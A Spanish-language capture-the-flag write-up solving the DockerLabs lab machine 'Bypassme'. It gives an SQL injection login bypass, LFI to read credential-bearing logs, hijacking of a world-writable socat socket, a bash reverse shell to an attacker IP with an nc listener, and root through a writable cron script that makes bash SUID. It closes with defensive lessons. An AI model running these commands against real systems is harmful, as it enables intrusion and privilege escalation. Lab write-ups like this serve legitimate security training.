# Bypassme — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** RSA  
**Fecha de creación:** 30/05/2025  
**Técnicas:** Nmap · SQL Injection (bypass login) · LFI via parámetro page · Logs expuestos · SSH · ps aux · Socket UNIX → conx · Reverse Shell · CRON root · bash -p

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [SQL Injection — bypass del login](#2-sql-injection--bypass-del-login)
3. [LFI — logs expuestos con credenciales](#3-lfi--logs-expuestos-con-credenciales)
4. [Acceso SSH como albert](#4-acceso-ssh-como-albert)
5. [Movimiento lateral — albert → conx via socket UNIX](#5-movimiento-lateral--albert--conx-via-socket-unix)
6. [Escalada a root — CRON con script modificable](#6-escalada-a-root--cron-con-script-modificable)
7. [Lección aprendida](#7-lección-aprendida)

---

## 1. Despliegue y reconocimiento

```bash
sudo bash auto_deploy.sh bypassme.tar
```

> IP asignada: `172.17.0.2`.

Escaneo completo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
cat Puertos
```

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
| http-cookie-flags: httponly flag not set
| http-title: Login Panel
|_Requested resource was login.php
```

---

## 2. SQL Injection — bypass del login

Visitamos `http://172.17.0.2` — nos redirige a `login.php`. Probamos SQL Injection clásico en el campo username:

```
Username: Admin
Password: admin ' OR '1'='1' -- -
```

> 💡 **`' OR '1'='1' -- -`** cierra el string del SQL, añade una condición siempre verdadera y comenta el resto de la consulta. Si la aplicación no usa consultas parametrizadas, hace que la condición `WHERE` sea siempre cierta y permite el acceso.

Accedemos al panel de administrador:

```
Welcome, admin!
Last login: 2025-09-10 16:04:24
Role: Administrator
Access Level: Full
[!] Warning: System error logs are exposed to the public folder
```

El panel nos avisa: los logs están expuestos. Inspeccionamos el código fuente:

```html
<!-- dev note: remember to secure logs.txt path before deploy -->
```

---

## 3. LFI — logs expuestos con credenciales

Accedemos al log mediante el parámetro `page` con LFI:

```
http://172.17.0.2/index.php?page=/logs/logs.txt
```

El log contiene registros de intentos de login e información sensible:

```
[2024-03-29 12:64:12] ERROR: Login failed for user 'root'
[2024-03-29 12:64:12] DEBUG: Trying password 'YwRtaw4xMJMe='
[2024-03-29 12:64:24] DEBUG: Trying password 'dGVzdDEyMw=='
[2024-03-29 12:64:25] SUCCESS: Auth success for user 'albert'
[2024-03-29 12:64:26] DEBUG: Session token issued: 38b2fdcbffe78b9989f3e
[2024-03-29 12:64:27] DEBUG: SSH connection established from 10.10.14.8
[2024-03-29 12:64:28] DEBUG: User 'albert' added to sudo group
[2024-03-29 12:64:29] DEBUG: File accessed: /var/www/html/index.php?page=welcome
[2024-03-29 12:64:30] DEBUG: File accessed: /etc/passwd
```

En los logs vemos que `dGVzdDEyMw==` es Base64 → decodificamos: **test123**. Y que el usuario es **albert**.

---

## 4. Acceso SSH como albert

```bash
ssh albert@172.17.0.2
```

```
albert@172.17.0.2's password: test123
albert@68a99ac0617f:~$
```

Intentamos escalada por sudo y SUID pero sin éxito — sudo no está instalado. Enumeramos procesos:

```bash
albert@68a99ac0617f:~$ ps aux
```

Vemos el usuario **conx** ejecutando un proceso con un socket UNIX:

```
conx   53  0.0  socat UNIX-LISTEN:/home/conx/.cache/.sock,fork EXEC:/bin/bash
```

En `/home/conx/.cache/` encontramos el socket:

```bash
albert@68a99ac0617f:~$ ls -la /home/conx/.cache/
srwxrw-rw- 1 conx conx 0 Sep 10 10:02 .sock
```

El socket tiene permisos de escritura para todos (`rw-rw-rw-`).

---

## 5. Movimiento lateral — albert → conx via socket UNIX

Nos conectamos al socket usando socat:

```bash
albert@68a99ac0617f:/home/conx/.cache$ socat - UNIX-CONNECT:/home/conx/.cache/.sock
whoami
conx
```

Somos **conx**. Generamos una reverse shell para trabajar más cómodamente:

```bash
# En nuestra máquina atacante:
sudo nc -lvnp 443

# Desde el socket como conx (payload de revshells.com):
bash -i >& /dev/tcp/192.168.1.26/443 0>&1
```

---

## 6. Escalada a root — CRON con script modificable

Como conx, miramos los procesos en ejecución:

```bash
conx@68a99ac0617f:~$ ps aux | cat
```

```
root  49  0.0  /usr/sbin/cron -P
```

Root ejecuta cron. Exploramos `/etc/cron.d`:

```bash
conx@68a99ac0617f:/usr/sbin$ cd /etc/cron.d
conx@68a99ac0617f:/etc/cron.d$ ls
backup-cron  e2scrub_all  php

conx@68a99ac0617f:/etc/cron.d$ cat backup-cron
* * * * * root bash /var/backups/backup.sh
```

Root ejecuta `/var/backups/backup.sh` cada minuto. Verificamos permisos:

```bash
conx@68a99ac0617f:/etc/cron.d$ ls -la /var/backups/backup.sh
-rwxrwxrwx 1 root root ... /var/backups/backup.sh
```

El script es escribible por todos. Lo sobreescribimos para activar el SUID en bash:

```bash
conx@68a99ac0617f:/etc/cron.d$ echo "chmod u+s /bin/bash" > /var/backups/backup.sh
```

Esperamos hasta el siguiente minuto y ejecutamos:

```bash
conx@68a99ac0617f:/etc/cron.d$ bash -p
bash-5.2# whoami
root
```

✅ Somos **root**.

---

## 7. Lección aprendida

| Vulnerabilidad | Dónde | Impacto |
|----------------|-------|---------|
| **SQL Injection en login** | `login.php` | Bypass de autenticación |
| **Logs con credenciales expuestos por LFI** | `?page=/logs/logs.txt` | Credenciales SSH de albert |
| **Socket UNIX con permisos de escritura para todos** | `/home/conx/.cache/.sock` | Acceso como conx |
| **Script CRON de root con permisos 777** | `/var/backups/backup.sh` | Escalada a root |

**Para defenderse:**
- Usar consultas parametrizadas para eliminar SQL injection.
- Los ficheros de log nunca deben ser accesibles desde la web, y menos a través de LFI.
- Los sockets UNIX deben tener permisos restrictivos — `srwx------` como mínimo.
- Los scripts ejecutados por cron de root deben pertenecer a root:root con permisos 700 o menos.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
